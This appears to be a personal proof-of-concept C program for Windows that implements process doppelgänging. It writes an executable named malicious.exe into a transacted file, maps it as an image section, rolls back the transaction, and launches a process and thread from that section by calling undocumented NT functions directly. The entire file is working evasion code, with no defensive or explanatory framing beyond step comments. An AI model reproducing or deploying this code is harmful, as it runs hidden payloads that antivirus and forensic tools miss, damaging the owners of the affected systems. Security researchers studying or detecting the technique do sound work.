#include <Windows.h>
#include <Ktmw32.h>
#include <stdio.h>
#include <userenv.h>

#pragma comment(lib, "Ktmw32.lib")
#pragma comment(lib, "Ntdll.lib")
#pragma comment(lib, "userenv.lib")

#define GDI_HANDLE_BUFFER_SIZE 34
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001

typedef LONG KPRIORITY;

typedef struct _STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PCHAR  Buffer;

} STRING, * PSTRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
    USHORT Flags;
    USHORT Length;
    ULONG  TimeStamp;
    STRING DosPath;

} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;

} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _CURDIR
{
    UNICODE_STRING DosPath;
    HANDLE Handle;

} CURDIR, * PCURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
    ULONG MaximumLength;                            
    ULONG Length;                                   
    ULONG Flags;                                    
    ULONG DebugFlags;
    PVOID ConsoleHandle;                            
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;
    CURDIR CurrentDirectory;                        
    UNICODE_STRING DllPath;                         
    UNICODE_STRING ImagePathName;                  
    UNICODE_STRING CommandLine;                     
    PVOID Environment;                             
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;                            
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;                     
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectores[0x20];
    ULONG EnvironmentSize;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;        
    PVOID SecurityQualityOfService; 

} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _PEB_LDR_DATA
{
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;               
    LIST_ENTRY InMemoryOrderModuleList;             
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID      EntryInProgress;

} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB_FREE_BLOCK
{
    struct _PEB_FREE_BLOCK* Next;
    ULONG Size;

} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace;      
    BOOLEAN ReadImageFileExecOptions;   
    BOOLEAN BeingDebugged;              
    BOOLEAN SpareBool;                  
    HANDLE Mutant;                      
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PVOID FastPebLock;
    PVOID FastPebLockRoutine;
    PVOID FastPebUnlockRoutine;
    ULONG EnvironmentUpdateCount;
    PVOID KernelCallbackTable;
    HANDLE SystemReserved;
    PVOID  AtlThunkSListPtr32;
    PPEB_FREE_BLOCK FreeList;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];        
    PVOID ReadOnlySharedMemoryBase;
    PVOID ReadOnlySharedMemoryHeap;
    PVOID* ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;
    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;
    LARGE_INTEGER CriticalSectionTimeout;
    ULONG HeapSegmentReserve;
    ULONG HeapSegmentCommit;
    ULONG HeapDeCommitTotalFreeThreshold;
    ULONG HeapDeCommitFreeBlockThreshold;
    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID* ProcessHeaps;
    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    PVOID GdiDCAttributeList;
    PVOID LoaderLock;
    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG ImageProcessAffinityMask;
    ULONG GdiHandleBuffer[GDI_HANDLE_BUFFER_SIZE];

} PEB, * PPEB;

typedef struct _PROCESS_BASIC_INFORMATION
{
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;

} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation,
    ProcessQuotaLimits,
    ProcessIoCounters,
    ProcessVmCounters,
    ProcessTimes,
    ProcessBasePriority,
    ProcessRaisePriority,
    ProcessDebugPort,
    ProcessExceptionPort,
    ProcessAccessToken,
    ProcessLdtInformation,
    ProcessLdtSize,
    ProcessDefaultHardErrorMode,
    ProcessIoPortHandlers,          
    ProcessPooledUsageAndLimits,
    ProcessWorkingSetWatch,
    ProcessUserModeIOPL,
    ProcessEnableAlignmentFaultFixup,
    ProcessPriorityClass,
    ProcessWx86Information,
    ProcessHandleCount,
    ProcessAffinityMask,
    ProcessPriorityBoost,
    ProcessDeviceMap,
    ProcessSessionInformation,
    ProcessForegroundInformation,
    ProcessWow64Information,
    ProcessImageFileName,
    ProcessLUIDDeviceMapsEnabled,
    ProcessBreakOnTermination,
    ProcessDebugObjectHandle,
    ProcessDebugFlags,
    ProcessHandleTracing,
    MaxProcessInfoClass                             
} PROCESSINFOCLASS;

typedef NTSTATUS(NTAPI* _NtCreateSection)(
    PHANDLE,
    ACCESS_MASK,
    POBJECT_ATTRIBUTES,
    PLARGE_INTEGER,
    ULONG,
    ULONG,
    HANDLE
);

typedef NTSTATUS(NTAPI* _NtCreateProcessEx)(
    PHANDLE,
    ACCESS_MASK,
    POBJECT_ATTRIBUTES,
    HANDLE,
    ULONG,
    HANDLE,
    HANDLE,
    HANDLE,
    BOOLEAN
);

typedef NTSTATUS(NTAPI* _NtReadVirtualMemory) (
    HANDLE,
    PVOID,
    PVOID,
    ULONG,
    PULONG
);

typedef NTSTATUS(NTAPI* _RtlCreateProcessParametersEx) (
    PRTL_USER_PROCESS_PARAMETERS*,
    PUNICODE_STRING,
    PUNICODE_STRING,
    PUNICODE_STRING,
    PUNICODE_STRING,
    PVOID,
    PUNICODE_STRING,
    PUNICODE_STRING,
    PUNICODE_STRING,
    PUNICODE_STRING,
    ULONG
);

typedef NTSTATUS(NTAPI* _NtCreateThreadEx) (
    PHANDLE,
    ACCESS_MASK,
    POBJECT_ATTRIBUTES,
    HANDLE,
    PVOID,
    PVOID,
    ULONG,
    ULONG_PTR,
    SIZE_T,
    SIZE_T,
    PVOID
);

int main(void) {

    /***********************************************************************************|
    |																					|
    | (1) create transacted file														|
    |																					|
    ************************************************************************************/

    /***********************************************|
    | ( ) create transaction                        |
    |												|
    ************************************************/

    HANDLE hTransaction;

    hTransaction = CreateTransaction(
        NULL,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );

    if (hTransaction == INVALID_HANDLE_VALUE) {
        printf("failed to create transaction\n");
        exit(1);
    }

    /***********************************************|
    | ( ) create file in transaction                |
    |												|
    ************************************************/

    HANDLE hTransactedFile;
    wchar_t* TgtFileName = L"C:\\Users\\aaron\\Desktop\\proc_doppelgang\\target.exe";

    hTransactedFile = CreateFileTransactedW(
        TgtFileName,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );

    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        printf("failed to create file in transaction\n");
        exit(1);
    }

    /***********************************************************************************|
    |																					|
    | (1) load malicious file into memory												|
    |																					|
    ************************************************************************************/

    /***********************************************|
    | (a) get handler to malicious file             |
    |												|
    ************************************************/

    HANDLE hMalFile;
    wchar_t* MalFileName = L"C:\\Users\\aaron\\Desktop\\proc_doppelgang\\malicious.exe";

    hMalFile = CreateFileW(
        MalFileName,
        GENERIC_READ,
        FILE_SHARE_READ,
        0,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        0
    );

    if (hMalFile == INVALID_HANDLE_VALUE) {
        printf("failed to open malicious executable\n");
        exit(1);
    }

    /***********************************************|
    | (b) create mapping object                     |
    |												|
    ************************************************/

    HANDLE hMalFileMapping;

    hMalFileMapping = CreateFileMapping(
        hMalFile,
        0,
        PAGE_READONLY,
        0,
        0,
        0
    );

    if (!hMalFileMapping) {
        printf("failed to create file mapping\n");
        CloseHandle(hMalFile);
        exit(1);
    }

    /***********************************************|
    | ( ) map view of file mapping into process     |
    |												|
    ************************************************/

    BYTE *pMalFileMappingAddr;

    pMalFileMappingAddr = (BYTE *)MapViewOfFile(
        hMalFileMapping,
        FILE_MAP_READ,
        0,
        0,
        0
    );

    if (!pMalFileMappingAddr) {
        printf("failed to map malicious executable\n");
        CloseHandle(hMalFile);
        CloseHandle(hMalFileMapping);
        exit(1);
    }

    /***********************************************|
    | ( ) get file size                             |
    |												|
    ************************************************/

    DWORD dwMalFileSize;

    dwMalFileSize = GetFileSize(hMalFile, 0);

    /***********************************************|
    | ( ) allocate memory for malicious file  	    |
    |												|
    ************************************************/

    BYTE *lpMalFileCopy;

    lpMalFileCopy = (BYTE *)VirtualAlloc(
        NULL,
        dwMalFileSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!lpMalFileCopy) {
        printf("failed to allocate memory for malicious executable\n");
        CloseHandle(hMalFile);
        CloseHandle(hMalFileMapping);
        exit(1);
    }

    /***********************************************|
    | ( ) copy malicious file to memory             |
    |												|
    ************************************************/

    memcpy(lpMalFileCopy, pMalFileMappingAddr, dwMalFileSize);

    /***********************************************|
    | ( ) cleanup                                   |
    |												|
    ************************************************/

    UnmapViewOfFile(pMalFileMappingAddr);
    CloseHandle(hMalFile);
    CloseHandle(hMalFileMapping);

    /***********************************************************************************|
    |																					|
    | (3) overwrite transacted file with malicious code								    |
    |																					|
    ************************************************************************************/

    /***********************************************|
    | ( ) write malicious code to transacted file   |
    |												|
    ************************************************/

    DWORD dwSuccess;
    DWORD dwByteWritten = 0;

    dwSuccess = WriteFile(
        hTransactedFile,
        lpMalFileCopy,
        dwMalFileSize,
        &dwByteWritten,
        NULL
    );

    if (!dwSuccess) {
        printf("failed to write malicious file to transacted file\n");
        exit(1);
    }

    /***********************************************************************************|
    |																					|
    | (4) create section from transacted file       								    |
    |																					|
    ************************************************************************************/

    /***********************************************|
    | ( ) load NtCreateSection                      |
    |												|
    ************************************************/

    HANDLE hNtdll;
    _NtCreateSection fpNtCreateSection;

    hNtdll = LoadLibraryA("ntdll.dll");

    if (hNtdll == NULL) {
        printf("failed to load ntdll.dll\n");
        exit(1);
    }
    
    fpNtCreateSection = (_NtCreateSection)GetProcAddress(
        hNtdll,
        "NtCreateSection"
    );

    if (fpNtCreateSection == NULL) {
        printf("failed to get address of NtCreateSection\n");
        exit(1);
    }
    
    /***********************************************|
    | ( ) create section object (can be shared)     |
    |												|
    ************************************************/

    HANDLE hSection;
    NTSTATUS status;

    status = fpNtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedFile
    );

    if (status != 0) { 
        printf("failed to create section\n");
        exit(1);
    }

    CloseHandle(hTransactedFile);

    /***********************************************************************************|
    |																					|
    | (5) rollback transaction                      								    |
    |																					|
    ************************************************************************************/

    /***********************************************|
    | ( ) rollback 	                                |
    |												|
    ************************************************/

    dwSuccess = RollbackTransaction(hTransaction);

    if (!dwSuccess) {
        printf("failed to rollback transation\n");
        exit(1);
    }

    CloseHandle(hTransaction);
    hTransaction = NULL;

    /***********************************************************************************|
    |																					|
    | (4) create process from section           										|
    |																					|
    ************************************************************************************/

    /***********************************************|
    | ( ) get address  	                            |
    |												|
    ************************************************/

    _NtCreateProcessEx fpNtCreateProcessEx;

    fpNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(
        hNtdll,
        "NtCreateProcessEx"
    );

    if (fpNtCreateProcessEx == NULL) {
        printf("failed to get address of NtCreateProcessEx\n");
        exit(1);
    }

    /***********************************************|
    | ( ) create process from section 	            |
    |												|
    ************************************************/

    HANDLE hTgtProcess;

    status = fpNtCreateProcessEx(
        &hTgtProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        (HANDLE) -1,            
        4, // CREATE_SUSPENDED
        hSection,               
        NULL,
        NULL,
        FALSE
    );

    if (status != 0) {
        printf("failed to create process\n");
        exit(1);
    }

    /***********************************************************************************|
    |																					|
    | ( ) read target process's PEB                             						|
    |																					|
    ************************************************************************************/

    /***********************************************|
    | ( ) get PEB address (process information)     |
    |												|
    ************************************************/

    PROCESS_BASIC_INFORMATION BasicInfo;
    DWORD dwRetLen = 0;

    status = NtQueryInformationProcess(
        hTgtProcess,
        ProcessBasicInformation,
        &BasicInfo,
        sizeof(PROCESS_BASIC_INFORMATION),
        &dwRetLen
    );

    if (status != 0  || !BasicInfo.PebBaseAddress) {
        printf("failed to get target process information\n");
        exit(1);
    }

    /***********************************************|
    | ( ) get address of NtReadVirtualMemory        |
    |												|
    ************************************************/

    _NtReadVirtualMemory fpNtReadVirtualMemory;

    fpNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(
        hNtdll,
        "NtReadVirtualMemory"
    );

    if (fpNtReadVirtualMemory == NULL) {
        printf("failed to get address of NtReadVirtualMemory\n");
        exit(1);
    }

    /***********************************************|
    | ( ) read target process's PEB                |
    |												|
    ************************************************/

    PEB peb;
    ULONG dwBytesRead;

    status = fpNtReadVirtualMemory(
        hTgtProcess,
        (PVOID)(ULONGLONG *)BasicInfo.PebBaseAddress,
        &peb,
        (ULONG) sizeof(peb),
        &dwBytesRead
    );

    if (status != 0) {
        printf("failed to read peb\n");
        exit(1);
    }

    /***********************************************************************************|
    |																					|
    | ( ) create process parameters in target process                                   |
    |																					|
    ************************************************************************************/

    /***********************************************|
    | ( ) set unicode strings  	                    |
    |												|
    ************************************************/

    UNICODE_STRING uTgtFileFullPath, uDllDir, uCurrentDir, uWindowName;

    RtlInitUnicodeString(
        &uTgtFileFullPath,
        L"C:\\Users\\aaron\\Desktop\\proc_doppelgang\\target.exe"
    );

    RtlInitUnicodeString(
        &uDllDir,
        L"C:\\Windows\\System32"
    );

    RtlInitUnicodeString(
        &uCurrentDir,
        L"C:\\Users\\aaron\\Desktop\\proc_doppelgang"
    );

    RtlInitUnicodeString(
        &uWindowName,
        L"Process Doppelganger"
    );

    /***********************************************|
    | ( ) create environment block                  |
    |												|
    ************************************************/

    LPVOID lpEnvironmentBlock;

    CreateEnvironmentBlock(
        &lpEnvironmentBlock, 
        NULL, 
        TRUE
    );

    /***********************************************|
    | ( ) get addresss of function                  |
    |												|
    ************************************************/

    _RtlCreateProcessParametersEx fpRtlCreateProcessParametersEx;

    fpRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(
        hNtdll,
        "RtlCreateProcessParametersEx"
    );

    if (fpRtlCreateProcessParametersEx == NULL) {
        printf("failed to get address of RtlCreateProcessParametersEx\n");
        exit(1);
    }

    /***********************************************|
    | ( ) create process parameters                 |
    |												|
    ************************************************/

    PRTL_USER_PROCESS_PARAMETERS params;

    status = fpRtlCreateProcessParametersEx(
        &params,
        (PUNICODE_STRING)&uTgtFileFullPath,
        (PUNICODE_STRING)&uDllDir,
        (PUNICODE_STRING)&uCurrentDir,
        (PUNICODE_STRING)&uTgtFileFullPath,
        lpEnvironmentBlock,
        (PUNICODE_STRING)&uWindowName,
        NULL,
        NULL,
        NULL,
        0x00000001
    );

    if (status != 0) {
        printf("failed to create process parameters\n");
        exit(1);
    }

    /***********************************************************************************|
    |																					|
    | ( ) write params and environment to process and update PEB to point to params     |
    |																					|
    ************************************************************************************/

    /***********************************************|
    | ( ) get beginning and end of params / env     |
    |												|
    ************************************************/
    
    PVOID pBufferStart = params;
    ULONG_PTR pBufferEnd, pEnvEnd;
    
    pBufferStart = params;
    pBufferEnd = (ULONG_PTR)params + params->Length;
    pEnvEnd = (ULONG_PTR)params->Environment + params->EnvironmentSize;

    if (params->Environment) {
        if ((ULONG_PTR)params > (ULONG_PTR)params->Environment) {
            pBufferStart = (PVOID)params->Environment;
        }
        if (pEnvEnd > pBufferEnd) {
            pBufferEnd = pEnvEnd;
        }
    }
    
    /***********************************************|
    | ( ) allocate space in target process          |
    |												|
    ************************************************/
    
    LPVOID pSuccess;
    SIZE_T buffer_size = pBufferEnd - (ULONG_PTR)pBufferStart;

    pSuccess = VirtualAllocEx(
        hTgtProcess,
        pBufferStart,
        buffer_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!pSuccess) {
        printf("failed to allocate memory for params /env in target process\n");
        exit(1);
    }
    
    /***********************************************|
    | ( ) write params in target process            |
    |												|
    ************************************************/
    
    BOOL bSuccess;

    bSuccess = WriteProcessMemory(
        hTgtProcess,
        (LPVOID)params,
        (LPVOID)params,
        params->Length,
        NULL
    );

    if (!bSuccess) {
        printf("failed to write params to target process\n");
        exit(1);
    }
    
    /***********************************************|
    | ( ) write environment in target process       |
    |												|
    ************************************************/
    
    bSuccess = WriteProcessMemory(
        hTgtProcess,
        (LPVOID)params->Environment,
        (LPVOID)params->Environment,
        params->EnvironmentSize,
        NULL
    );

    if (!bSuccess) {
        printf("failed to write environment to target process\n");
        exit(1);
    }

    /***********************************************|
    | ( ) write address of parameters into PEB      |
    |												|
    ************************************************/

    ULONGLONG offset;
    LPVOID remote_img_base;
    SIZE_T written = 0;

    offset = (ULONGLONG)&peb.ProcessParameters - (ULONGLONG)&peb;
    remote_img_base = (LPVOID)((ULONGLONG)BasicInfo.PebBaseAddress + offset);

    bSuccess = WriteProcessMemory(
        hTgtProcess,
        remote_img_base,
        &params,
        sizeof(PVOID),
        &written
    );

    if (!bSuccess) {
        printf("failed to write params to peb\n");
        exit(1);
    }

    /***********************************************************************************|
    |																					|
    | ( ) create thread                                                                 |
    |																					|
    ************************************************************************************/

    /***********************************************|
    | ( ) determine process's entry point           |
    |												|
    ************************************************/

    PIMAGE_DOS_HEADER pMalDosHdr;
    PIMAGE_NT_HEADERS64 pMalNtHdr;
    ULONGLONG dwProcEntryPoint;
    DWORD dwMalEntryPoint;

    pMalDosHdr = (PIMAGE_DOS_HEADER)lpMalFileCopy;
    pMalNtHdr = (PIMAGE_NT_HEADERS64)((ULONGLONG)pMalDosHdr + pMalDosHdr->e_lfanew);
    dwMalEntryPoint = pMalNtHdr->OptionalHeader.AddressOfEntryPoint;
    dwProcEntryPoint = (ULONGLONG)peb.ImageBaseAddress + dwMalEntryPoint;
    
    /***********************************************|
    | ( )  	                                        |
    |												|
    ************************************************/

    _NtCreateThreadEx fpNtCreateThreadEx;

    fpNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(
        hNtdll,
        "NtCreateThreadEx"
    );

    if (fpNtCreateThreadEx == NULL) {
        printf("failed to get address of NtCreateThreadEx\n");
        exit(1);
    }

    /***********************************************|
    | ( )  	                                        |
    |												|
    ************************************************/
    /***********************************************************************************|
    |																					|
    | ( ) create thread                                                                 |
    |																					|
    ************************************************************************************/


    HANDLE hThread;

    status = fpNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS, 
        NULL,
        hTgtProcess,
        (LPTHREAD_START_ROUTINE)dwProcEntryPoint,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != 0) {
        printf("failed to create thread\n");
        exit(1);
    }

    /***********************************************|
    | ( )  	                                        |
    |												|
    ************************************************/

    VirtualFree(lpMalFileCopy, dwMalFileSize, MEM_DECOMMIT);

}